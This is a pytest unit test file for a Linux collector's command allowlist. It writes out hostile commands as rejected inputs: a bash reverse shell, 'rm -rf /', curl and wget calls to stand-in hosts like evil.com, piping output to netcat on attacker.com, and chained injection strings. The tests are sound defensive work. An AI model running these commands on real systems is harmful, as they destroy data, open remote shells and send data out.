"""
Unit tests for BaseCollector and command allowlist.
"""

import pytest

from backend.collectors.base import (
    BaseCollector,
    CollectorResult,
    LinuxDistro,
    SecurityError,
    is_command_allowed,
)


def test_allowlist_exact_match():
    """Test exact command match."""
    assert is_command_allowed("cat /etc/os-release") is True
    assert is_command_allowed("cat /etc/passwd") is True
    assert is_command_allowed("hostname") is True
    assert is_command_allowed("uname -a") is True


def test_allowlist_parameterized():
    """Test parameterized command prefix match."""
    assert is_command_allowed("chage -l jdoe") is True
    assert is_command_allowed("passwd -S asmith") is True
    assert is_command_allowed("id deploy") is True
    assert is_command_allowed("systemctl show sshd.service") is True


def test_allowlist_rejects_arbitrary():
    """Test that arbitrary commands are rejected."""
    assert is_command_allowed("rm -rf /") is False
    assert is_command_allowed("curl http://evil.com") is False
    assert is_command_allowed("wget malware.sh") is False
    assert is_command_allowed("echo pwned > /etc/passwd") is False
    assert is_command_allowed("bash -i >& /dev/tcp/10.0.0.1/4242 0>&1") is False
    assert is_command_allowed("python -c 'import os; os.system(\"id\")'") is False


def test_allowlist_rejects_command_injection():
    """Test command injection attempts are rejected."""
    assert is_command_allowed("cat /etc/passwd; rm -rf /") is False
    assert is_command_allowed("cat /etc/passwd && curl evil.com") is False
    assert is_command_allowed("hostname | nc attacker.com 1234") is False


@pytest.mark.asyncio
async def test_base_collector_rejects_bad_command(mock_connection):
    """Test SecurityError raised for non-allowlisted commands."""

    class TestCollector(BaseCollector):
        name = "test"
        version = "1.0.0"
        description = "Test"

        async def collect(self, connection, distro):
            await self.execute_command(connection, "rm -rf /tmp")
            return {}

    conn = mock_connection({})
    collector = TestCollector()
    result = await collector.run(conn, LinuxDistro.RHEL)

    assert result.success is False
    assert "not in allowlist" in result.errors[0]


@pytest.mark.asyncio
async def test_base_collector_unsupported_distro(mock_connection):
    """Test collector reports unsupported distribution."""

    class LimitedCollector(BaseCollector):
        name = "limited"
        version = "1.0.0"
        description = "Only RHEL"
        supported_distros = frozenset([LinuxDistro.RHEL])

        async def collect(self, connection, distro):
            return {"test": True}

    conn = mock_connection({})
    collector = LimitedCollector()
    result = await collector.run(conn, LinuxDistro.UBUNTU)

    assert result.success is False
    assert "Unsupported distribution" in result.errors[0]
